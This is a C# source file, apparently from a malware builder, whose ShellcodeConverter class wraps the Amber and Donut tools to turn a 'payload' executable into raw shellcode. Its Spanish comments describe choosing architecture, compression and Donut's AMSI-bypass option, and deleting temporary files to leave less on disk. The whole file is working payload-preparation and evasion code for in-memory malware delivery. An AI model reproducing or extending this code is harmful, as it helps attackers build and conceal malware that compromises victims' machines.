using System;
using System.Diagnostics;
using System.IO;
using System.Threading.Tasks;

namespace Builder
{
    public static class ShellcodeConverter
    {
        public static byte[] GetAmberShellcode(string exePath)
        {
            if (!File.Exists(exePath))
                throw new FileNotFoundException($"[-] Error: No se encontró el payload original: {exePath}");

            string amberPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "amber.exe");

            if (!File.Exists(amberPath))
                throw new FileNotFoundException("[-] Error: 'amber.exe' no está en el directorio raíz. ¡Añádelo a la carpeta del Builder!");

            // Archivo temporal de salida
            string outputBinPath = Path.Combine(Path.GetDirectoryName(exePath), "output_amber_temp.bin");

            if (File.Exists(outputBinPath))
                File.Delete(outputBinPath);

            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = amberPath,
                Arguments = $"-f \"{exePath}\" -o \"{outputBinPath}\"",
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            };

            using (Process process = Process.Start(startInfo))
            {
                process.WaitForExit();
                string errors = process.StandardError.ReadToEnd();

                if (process.ExitCode != 0 || !File.Exists(outputBinPath))
                {
                    throw new Exception($"Fallo al convertir con Amber. Detalle: {errors}");
                }
            }

            // Leemos los bytes generados a la memoria
            byte[] shellcodeBytes = File.ReadAllBytes(outputBinPath);

            // ¡Limpieza inmediata del disco!
            //File.Delete(outputBinPath);

            return shellcodeBytes;
        }


        public static async Task<byte[]> GetDonutShellcode(string exePath)
        {
            return await Task.Run(() =>
            {
                string donutPath = "donut.exe"; // Asegúrate que esté junto al Server.exe
                if (!File.Exists(donutPath)) throw new FileNotFoundException("No se encontró donut.exe");

                // 1. Detectar Arquitectura
                int arch = Utils.GetPeArchitecture(exePath); // 1=x86, 2=x64

                // 2. Definir archivo de salida temporal
                string outFile = Path.Combine(Path.GetTempPath(), $"sc_{Guid.NewGuid()}.bin");

                // 3. Construir Argumentos
                // -i: Archivo input
                // -f: Formato 1 (raw)
                // -a: Arquitectura (Dinámica)
                // -z 2: Nivel de entropía/compresión
                // -b 3: Comportamiento AMSI (3=Skip si falla)
                // -p: Parámetros (nombre del pipe)
                // -o: Archivo de salida
                string args = $"-i \"{exePath}\" -f 1 -a {arch} -z 2 -b 3 -o \"{outFile}\"";

                // 4. Ejecutar Donut
                var procInfo = new System.Diagnostics.ProcessStartInfo
                {
                    FileName = donutPath,
                    Arguments = args,
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };

                using (var proc = System.Diagnostics.Process.Start(procInfo))
                {
                    proc.WaitForExit();
                    if (proc.ExitCode != 0)
                    {
                        string err = proc.StandardError.ReadToEnd();
                        throw new Exception($"Donut falló: {err}");
                    }
                }

                // 5. Leer y Limpiar
                if (File.Exists(outFile))
                {
                    byte[] shellcode = File.ReadAllBytes(outFile);
                    try { File.Delete(outFile); } catch { } // Borrar temp
                    return shellcode;
                }

                throw new Exception("No se generó el archivo de salida (shellcode).");
            });
        }
    }
}